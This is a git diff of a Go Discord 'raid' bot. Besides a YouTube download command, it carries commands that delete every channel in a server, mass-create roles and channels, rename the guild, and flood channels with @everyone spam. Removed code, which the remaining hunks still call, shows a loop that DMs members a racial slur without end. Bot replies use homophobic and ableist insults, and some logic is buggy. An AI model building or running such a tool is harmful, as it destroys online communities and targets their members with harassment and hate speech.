@@ -1,21 +1,29 @@
 package main
 
 import (
+	"context"
 	"fmt"
-	"math/rand"
 	"os"
 	"os/signal"
+	"strings"
 	"syscall"
 	"time"
 
 	"github.com/bwmarrin/discordgo"
+	"github.com/wader/goutubedl"
 	"gopkg.in/yaml.v3"
 )
 
 type Config struct {
+	WebServer struct {
+		Enabled bool   `yaml:"enabled"`
+		Host    string `yaml:"host"`
+		Port    int    `yaml:"port"`
+	} `yaml:"webServer"`
 	Bot struct {
 		Token      string   `yaml:"token"`
 		AllowedIds []string `yaml:"allowedIds"`
+		Prefix     string   `yaml:"prefix"`
 
 		Status struct {
 			Messages []string `yaml:"messages"`
@@ -30,9 +38,10 @@ type Config struct {
 				Delay  int      `yaml:"delay"`
 			} `yaml:"guildEdit"`
 			Channels struct {
-				Names  []string `yaml:"names"`
-				Amount int      `yaml:"amount"`
-				Edit   struct {
+				Names           []string `yaml:"names"`
+				Amount          int      `yaml:"amount"`
+				WaitForCreation bool     `yaml:"waitForCreation"`
+				Edit            struct {
 					Enable bool `yaml:"enable"`
 					Delay  int  `yaml:"delay"`
 				} `yaml:"edit"`
@@ -63,8 +72,6 @@ func main() {
 		return
 	}
 
-	println(config.Bot.Status.Messages[0])
-
 	ticker := time.Tick(5 * time.Second)
 
 	stop := make(chan os.Signal, 1)
@@ -82,8 +89,6 @@ func main() {
 				dg.UpdateGameStatus(0, statuses[statusIndex])
 				statusIndex = (statusIndex + 1) % len(statuses)
 			case <-stop:
-				// Handle cleanup or any necessary finalization
-				fmt.Println("Received termination signal. Exiting...")
 				return
 			}
 		}
@@ -91,7 +96,7 @@ func main() {
 	})
 
 	dg.AddHandler(func(s *discordgo.Session, r *discordgo.RateLimit) {
-		fmt.Println(fmt.Sprintf("(!) RATELIMITED (retry after: %f seconds)", r.RetryAfter.Seconds()))
+		fmt.Println(fmt.Sprintf("(!) %s (retry after: %f seconds)", r.Message, r.RetryAfter.Seconds()))
 	})
 
 	// Register the messageCreate func as a callback for MessageCreate events.
@@ -107,31 +112,63 @@ func main() {
 		return
 	}
 
-	// Wait here until CTRL-C or other term signal is received.
-	fmt.Println("Bot is now running.  Press CTRL-C to exit.")
-	sc := make(chan os.Signal, 1)
-	signal.Notify(sc, syscall.SIGINT, syscall.SIGTERM, os.Interrupt)
-	<-sc
+	go StartWebServer(dg)
 
-	// Cleanly close down the Discord session.
+	<-stop
+
+	fmt.Printf("Shutting down bot")
 	dg.Close()
 }
 
-// This function will be called (due to AddHandler above) every time a new
-// message is created on any channel that the authenticated bot has access to.
 func messageCreate(s *discordgo.Session, m *discordgo.MessageCreate) {
-	// Ignore all messages created by the bot itself
-	// This isn't required in this specific example but it's a good practice.
-	if m.Author.ID == s.State.User.ID {
+	if m.Author.ID == s.State.User.ID || m.Author.Bot {
 		return
 	}
 
-	if m.Content == "-delchannels" {
-		if m.Author.ID != "890320508984377354" {
-			s.ChannelMessageSend(m.ChannelID, "are you autistic?")
+	if strings.HasPrefix(m.Content, config.Bot.Prefix+"ytdl") {
+		link := strings.Trim(m.Content, config.Bot.Prefix+"ytdl")
+		link = strings.TrimSpace(link)
+
+		fmt.Println(link)
+
+		if !strings.HasPrefix(link, "https://www.youtube.com") {
+			s.ChannelMessageSend(m.ChannelID, "anna yt linkki homo")
 			return
 		}
 
+		goutubedl.Path = "yt-dlp"
+
+		result, err := goutubedl.New(context.Background(), link, goutubedl.Options{})
+
+		if err != nil {
+			fmt.Println(err.Error())
+			s.ChannelMessageSend(m.ChannelID, "jotai meni vikaa paskoiks tän hä? milffit yv btw")
+			return
+		}
+
+		dlResult, err := result.Download(context.Background(), "best")
+		defer dlResult.Close()
+
+		if err != nil {
+			s.ChannelMessageSend(m.ChannelID, "ei voitu lataa videoo lol")
+			return
+		}
+
+		s.ChannelFileSendWithMessage(m.ChannelID, "täs tää video lol", "juup", dlResult)
+	}
+
+	if m.Content == config.Bot.Prefix+"ping" {
+		s.ChannelMessageSend(m.ChannelID, fmt.Sprintf("jepjep heartbeat vaikkao on tommone: %s (tommone)", s.HeartbeatLatency().Round(time.Millisecond)))
+	}
+
+	for _, authUser := range config.Bot.AllowedIds {
+		if m.Author.ID != authUser {
+			s.ChannelMessageSend(m.ChannelID, "oot nyt musta eli se meinaa sitä et sul ei oo minkäänlaisia oikeuksia käyttää tätä Discord-palvelun automaattista Bottia. Varmaan vituttaa! :D")
+			return
+		}
+	}
+
+	if m.Content == config.Bot.Prefix+"delchannels" {
 		channels, err := s.GuildChannels(m.GuildID)
 
 		if err != nil {
@@ -139,13 +176,20 @@ func messageCreate(s *discordgo.Session, m *discordgo.MessageCreate) {
 			return
 		}
 
+		if len(channels) == 1 {
+			s.ChannelMessageSend(m.ChannelID, "kyl ny sokeaki huomaa et tos on vaa yks kanava vitu vammane")
+			return
+		}
+
 		for _, channel := range channels {
 			go s.ChannelDelete(channel.ID)
 		}
 
+		s.GuildChannelCreate(m.GuildID, "lollista", 0)
+
 	}
 
-	if m.Content == "-members" {
+	if m.Content == config.Bot.Prefix+"members" {
 		members, err := s.GuildMembers(m.GuildID, "", 1000)
 
 		if err != nil {
@@ -172,13 +216,8 @@ func messageCreate(s *discordgo.Session, m *discordgo.MessageCreate) {
 
 	}
 
-	if m.Content == "-jussi" {
-		if m.Author.ID != "890320508984377354" {
-			s.ChannelMessageSend(m.ChannelID, "are you autistic?")
-			return
-		}
-
-		go createChnlMsgs(m.GuildID, s)
+	if m.Content == config.Bot.Prefix+"jussi" {
+		amount := config.Bot.Raid.Channels.Amount
 
 		if config.Bot.Raid.GuildEdit.Enable == true {
 			go spamGuildEdit(m.GuildID, s)
@@ -186,6 +225,29 @@ func messageCreate(s *discordgo.Session, m *discordgo.MessageCreate) {
 
 		if config.Bot.Raid.Roles.Enable == true {
 			go spamRoleCreate(m.GuildID, s)
+		}
+
+		fmt.Printf("Creating %d channels\n", amount)
+
+		if config.Bot.Raid.Channels.WaitForCreation {
+			createChannels(m.GuildID, false, s)
+			time.Sleep(2)
+		} else {
+			go createChannels(m.GuildID, true, s)
+		}
+
+		guilds, err := s.GuildChannels(m.GuildID)
+
+		if err != nil {
+			println("Failed to get channels for gid" + m.GuildID)
+		}
+
+		for _, channel := range guilds {
+			go spamMessages(channel.ID, s)
+
+			if config.Bot.Raid.Channels.Edit.Enable == true {
+				go spamChannelEdit(channel.ID, s)
+			}
 		}
 
 		members, err := s.GuildMembers(m.GuildID, "", 1000)
@@ -210,129 +272,6 @@ func messageCreate(s *discordgo.Session, m *discordgo.MessageCreate) {
 			}
 
 			go sendMsgToMembers(userChannel, s)
-		}
-	}
-}
-
-func sendMsgToMembers(userChannel *discordgo.Channel, s *discordgo.Session) {
-	time.Sleep(3 * time.Second)
-	for {
-		s.ChannelMessageSend(userChannel.ID, "neekeri!")
-	}
-}
-
-func createChnlMsgs(gid string, s *discordgo.Session) {
-	amount := config.Bot.Raid.Channels.Amount
-
-	fmt.Printf("Creating %d channels\n", amount)
-
-	channels := createChannels(gid, s)
-
-	fmt.Printf("Done creating %d channels. Starting to spam messages to the channels.\n", amount)
-
-	for _, ch := range channels {
-		go spamMessages(ch, s)
-
-		if config.Bot.Raid.Channels.Edit.Enable == true {
-			go spamChannelEdit(ch, s)
-		}
-	}
-}
-
-func spamMessages(channelID string, s *discordgo.Session) {
-	messages := config.Bot.Raid.Messages
-	sendTicker := time.NewTicker(time.Duration(config.Bot.Raid.MessageDelay) * time.Millisecond)
-
-	for {
-		select {
-		case <-sendTicker.C:
-			println("(TICK) Sending msg to channel " + channelID)
-			randomIndex := rand.Intn(len(messages))
-			_, err := s.ChannelMessageSend(channelID, "@everyone"+messages[randomIndex])
-
-			if err != nil {
-				println("error sending msg to chn " + channelID)
-			}
-		}
-	}
-}
-
-func createChannels(gid string, s *discordgo.Session) (channelIDs []string) {
-	channelNames := config.Bot.Raid.Channels.Names
-	amount := config.Bot.Raid.Channels.Amount
-
-	var ids []string
-
-	for i := 0; i < amount; i++ {
-		randomIndex := rand.Intn(len(channelNames))
-		channel, err := s.GuildChannelCreate(gid, channelNames[randomIndex], 0)
-
-		fmt.Printf("")
-
-		println(err.Error())
-
-		if err != nil {
-			println("fail creating channel")
-		} else {
-			ids = append(ids, channel.ID)
-		}
-	}
-
-	return ids
-}
-
-func spamRoleCreate(gid string, s *discordgo.Session) {
-	roleNames := config.Bot.Raid.Roles.Names
-	amount := config.Bot.Raid.Roles.Amount
-
-	editTicker := time.NewTicker(time.Duration(config.Bot.Raid.Roles.Delay) * time.Millisecond)
-
-	for i := 0; i < amount; i++ {
-		select {
-		case <-editTicker.C:
-			println("(TICK) Creating new role")
-			randomIndex := rand.Intn(len(roleNames))
-			_, err := s.GuildRoleCreate(gid, &discordgo.RoleParams{
-				Name: roleNames[randomIndex],
-			})
-
-			if err != nil {
-				println("error creating new role for gid " + gid)
-			}
-		}
-	}
-}
-func spamGuildEdit(gid string, s *discordgo.Session) {
-	names := config.Bot.Raid.GuildEdit.Names
-	editTicker := time.NewTicker(time.Duration(config.Bot.Raid.GuildEdit.Delay) * time.Millisecond)
-
-	for {
-		select {
-		case <-editTicker.C:
-			println("(TICK) Changing guild name")
-			randomIndex := rand.Intn(len(names))
-			_, err := s.GuildEdit(gid, &discordgo.GuildParams{
-				Name: names[randomIndex],
-			})
-
-			if err != nil {
-				println("error editing channel for gid " + gid)
-			}
-		}
-	}
-}
-
-func spamChannelEdit(channelID string, s *discordgo.Session) {
-	messages := config.Bot.Raid.Messages
-	editTicker := time.NewTicker(time.Duration(config.Bot.Raid.Channels.Edit.Delay) * time.Millisecond)
-
-	for {
-		select {
-		case <-editTicker.C:
-			randomIndex := rand.Intn(len(messages))
-			s.ChannelEdit(channelID, &discordgo.ChannelEdit{
-				Name: messages[randomIndex],
-			})
 		}
 	}
 }
